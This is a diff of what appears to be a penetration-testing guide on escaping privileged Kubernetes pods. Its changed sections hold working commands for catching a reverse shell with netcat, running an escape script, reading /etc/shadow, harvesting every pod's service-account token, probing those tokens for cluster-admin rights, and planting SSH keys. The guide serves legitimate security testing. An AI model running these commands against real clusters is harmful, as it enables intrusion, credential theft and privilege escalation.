@@ -74,7 +74,7 @@ HOST="10.0.0.1" PORT="3116"
 envsubst < ./yaml/priv/pod-priv-revshell.yaml | kubectl apply -f -
 ```
 
-#### Catch the shell and chroot to /host 
+#### Catch the shell 
 ```bash
 ~ nc -nvlp 3116
 Listening on 0.0.0.0 3116
@@ -100,34 +100,6 @@ echo ZD1gZGlybmFtZSAkKGxzIC14IC9zKi9mcy9jKi8qL3IqIHxoZWFkIC1uMSlgCm1rZGlyIC1wICR
 ```bash
 sh undock.sh "cat /etc/shadow"
 ```
-
-#### Find all tokens from all pods 
-```bash
- sh undock.sh "find /var/lib/kubelet/pods/ -name token -type l"
-/var/lib/kubelet/pods/998357c8-45c7-4089-9651-cb8b185f7da8/volumes/kubernetes.io~secret/default-token-qqgjc/token
-/var/lib/kubelet/pods/2b181912-2444-43b4-83f4-faa13fe0f87b/volumes/kubernetes.io~secret/calico-node-token-d426t/token
-/var/lib/kubelet/pods/a824d7dc-c86b-41ea-a111-b190985d5f4d/volumes/kubernetes.io~secret/default-token-qqgjc/token
-/var/lib/kubelet/pods/001bdb14-a0c0-4fd0-ac4b-4b414cb8b075/volumes/kubernetes.io~secret/kube-proxy-token-x6j9x/token
-/var/lib/kubelet/pods/d04d2626-5f01-456c-815e-d7a3ad4a38a2/volumes/kubernetes.io~secret/default-token-qqgjc/token
-/var/lib/kubelet/pods/e8004bbe-56ae-4612-b1ec-61bb0a6fbc6f/volumes/kubernetes.io~secret/default-token-qqgjc/token
-```
-
-#### Cat out one of the tokens
-```bash
-sh undock.sh "cat /var/lib/kubelet/pods/998357c8-45c7-4089-9651-cb8b185f7da8/volumes/kubernetes.io~secret/default-token-qqgjc/token"
-eyJhbGciOiJSUzI1NiIsImtpZCI6Ik[redacted]
-```
-
-#### For each interesting token, copy token value to somewhere you have kubectl set and see what permissions it has assigned to it
-```bash
-DTOKEN=`cat /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-qqgjc/token`
-kubectl auth can-i --list --token=$DTOKEN -n development # Shows namespace specific permissions
-kubectl auth can-i --list --token=$DTOKEN #Shows cluster wide permissions
-```
-
-Does the token allow you to view secrets in that namespace? How about other namespaces?
-Does it allow you to create clusterrolebindings? Can you bind your user to cluster-admin?
-
 
 ### Option 2: Use Brandon Edwards and Nick Freeman’s version which upgrades you to an interactive shell
 
@@ -260,7 +232,7 @@ k8s-worker
 
 ## What to look for on a node
 
-#### Look for kubeconfig's in the host filesystem 
+### Look for kubeconfig's in the host filesystem 
 If you are lucky, you will find a cluster-admin config with full access to everything (not so lucky here on this GKE node)
 
 ```bash
@@ -276,25 +248,46 @@ find / -name kubeconfig
 /mnt/stateful_partition/var/lib/kubelet/kubeconfig
 /mnt/stateful_partition/var/lib/kube-proxy/kubeconfig
 ```
-
-#### Grab all tokens from all pods on the system
+### Find all tokens from all pods and see what permissions they have assigned to them
 Use something like access-matrix to see if any of them give you more permission than you currently have. Look for tokens that have permissions to get secrets in kube-system
 
+#### Grab all tokens from all pods on the system
+This lists the location of every service account used by every pod on the node you are on, and tells you the namespace. 
 ```bash
-# This lists the location of every service account used by every pod on the node you are on, and tells you the namespace. 
 tokens=`find /var/lib/kubelet/pods/ -name token -type l`; for token in $tokens; do parent_dir="$(dirname "$token")"; namespace=`cat $parent_dir/namespace`; echo $namespace "|" $token ; done | sort
-
-default | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-t25ss/token
-default | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-t25ss/token
-development | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-qqgjc/token
-development | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-qqgjc/token
-kube-system | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/kube-proxy-token-x6j9x/token
-kube-system | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/calico-node-token-d426t/token
 ```
+
+```
+default | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-t25ss/token
+default | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-t25ss/token
+development | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-qqgjc/token
+development | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-qqgjc/token
+kube-system | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/kube-proxy-token-x6j9x/token
+kube-system | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/calico-node-token-d426t/token
+```
+
+#### For each interesting token, copy token value to somewhere you have kubectl set and see what permissions it has assigned to it
+```bash
+cat /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-qqgjc/token`
+```
+```
+eyJhbGciOiJSUzI1NiIsImtpZCI6Ik[redacted]
+```
+
+#### System where you have kubectl installed:
+```bash
+DTOKEN=`echo eyJhbGciOiJSUzI1NiIsImtpZCI6Ik[redacted]`
+kubectl auth can-i --list --token=$DTOKEN -n development # Shows namespace specific permissions
+kubectl auth can-i --list --token=$DTOKEN #Shows cluster wide permissions
+```
+
+Does the token allow you to view secrets in that namespace? How about other namespaces?
+Does it allow you to create clusterrolebindings? Can you bind your user to cluster-admin?
+
 
 For each interesting token, copy token value to somewhere you have kubectl set and see what permissions it has assigned to it
 ```bash
-DTOKEN=`cat /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-qqgjc/token`
+DTOKEN=`cat /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-qqgjc/token`
 kubectl auth can-i --list --token=$DTOKEN -n development # Shows namespace specific permissions
 kubectl auth can-i --list --token=$DTOKEN #Shows cluster wide permissions
 ```
@@ -303,8 +296,8 @@ Does it allow you to create clusterrolebindings? Can you bind your user to clust
 
 
 #### Some other ideas:
-* Add your public key to node and ssh to it
-* Crack passwords in /etc/shadow, see if you can use them to access other nodes
+* Add your public key authorized_keys on the node and ssh to it
+* Crack passwords in /etc/shadow, see if you can use them to access control-plane nodes
 * Look at the volumes that each of the pods have mounted. You might find some pretty sensitive stuff in there. 
 
 
@@ -323,4 +316,5 @@ If you are performing a penetration test, the end goal is not to gain cluster-ad
 # Reference(s): 
 * https://twitter.com/_fel1x/status/1151487051986087936
 * https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/ 
+* https://www.youtube.com/watch?v=BQlqita2D2s
 * https://www.rapid7.com/db/modules/exploit/linux/local/docker_privileged_container_escape/
